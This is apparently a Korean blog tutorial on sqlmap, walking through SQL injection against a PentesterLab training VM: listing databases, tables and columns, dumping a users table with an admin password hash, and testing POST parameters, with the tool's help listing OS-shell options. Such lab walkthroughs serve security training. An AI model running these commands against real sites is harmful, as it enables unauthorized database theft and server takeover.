---
title: "SQLMap 사용법"
tags: [database, sqlmap]
author: eli_ez3r
key: 20191025
modify_date: 2019-10-25
article_header:
  type: cover
  image:
    src:
---

## 0x00. 개요

 **[sqlmap]( http://sqlmap.org/ )(automatic SQL injection and database takeover tool)**은 공개 모의침투 도구로 SQL구문삽입(SQL Injection) 취약점을 탐지/진단하고 데이터베이스에 직간접적으로 접근할 수 있는 취약점 분석 도구이다. 

SQL 구문삽입 공격은 DB 구조 파악이 가장 힘든 작업인데, 수작업으로 진행하기에는 매우 많은 시간이 걸린다. `sqlmap`은 DB 구조파악, 테이블 내용 유출 등을 자동화해주기 떄문에 웹취약점에 대한 수동분석 과정에서 상당히 많은 시간을 절약할 수 있게 도와주는 매우 훌륭한 프로그램이다. 

-----



## 0x01. 설치방법

Linux 시스템에서 다음과 같이 간단하게 설치할 수 있다.

```
apt-get install sqlmap -y
```

-----



## 0x02. 사용법

### (1) 도움말

다음 명령어를 통해서 `sqlmap`에 대한 도움말을 볼 수 있다.(보다 자세한 도움말을 보려면 `sqlmap -hh`)

```
sqlmap -h
```

```
root@ubuntu:~# sqlmap -h
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.3.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

-----



## 0x03. 실습

sqlmap 실습을 위해서 [PentesterLab의 From SQL Injection to Shell 훈련장]( https://pentesterlab.com/exercises/from_sqli_to_shell/course )을 대상으로 진행한다.

[경고]실제 서버를 공격하여 생기는 책임은 본인에게 있음을 경고합니다.
.{:.warning} 

 ![Image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025114201321.png){:.border.rounded} 

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025114516313.png){:.border.rounded}



### (1) GET 방식 입력 값 점검

다음 명령어를 이용하여 GET방식의 입력값 점검을 할 수 있다.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1"
```

 ![img](http://eliez3r.synology.me/assets/img/study/db/sqlmap/SNAGHTML38e12cd3.PNG){:.border.rounded}  

OS정보와 Web Application정보, DBMS정보등을 알아오는 것을 알 수 있다.



사전에 DBMS정보를 알고 있는 경우는 다음 명령어를 사용하면 된다.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbms=mysql
```



#### 데이터베이스 목록 조회

다음 명령어를 통해 데이터베이스의 목록을 조회할 수 있다.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbs
```

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025122018616.png){:.border.rounded} 



#### 테이블 목록 조회

데이터베이스의 이름을 알아내었으니 해당 데이터베이스의 테이블 목록을 조회해보자.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog --tables
```

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025122242193.png){:.border.rounded} 

해당 데이터베이스의 테이블들을 조회한 모습을 볼수 있다.



#### 컬럼 목록 조회

이제 해당 테이블의 컬럼 목록을 조회해보자.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --columns
```

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025122542041.png){:.border.rounded} 



#### 테이블 내용 덤프

users테이블의 모든 내용들을 덤프해보자.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --dump
```

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025122738312.png){:.border.rounded} 

user는 `admin` 계정이 존재하고 패스워드는 hash값으로 되어있지만, 해당 해쉬값이 P4ssw0rd 임을 알려준다.

-----



### (2) POST 방식 입력 값 점검

POST방식일 경우 `--data` 옵션을 이용하면된다.

```
sqlmap -u "http://192.168.23.131/admin/index.php" --data "user=USER&password=PASS"
```

-----

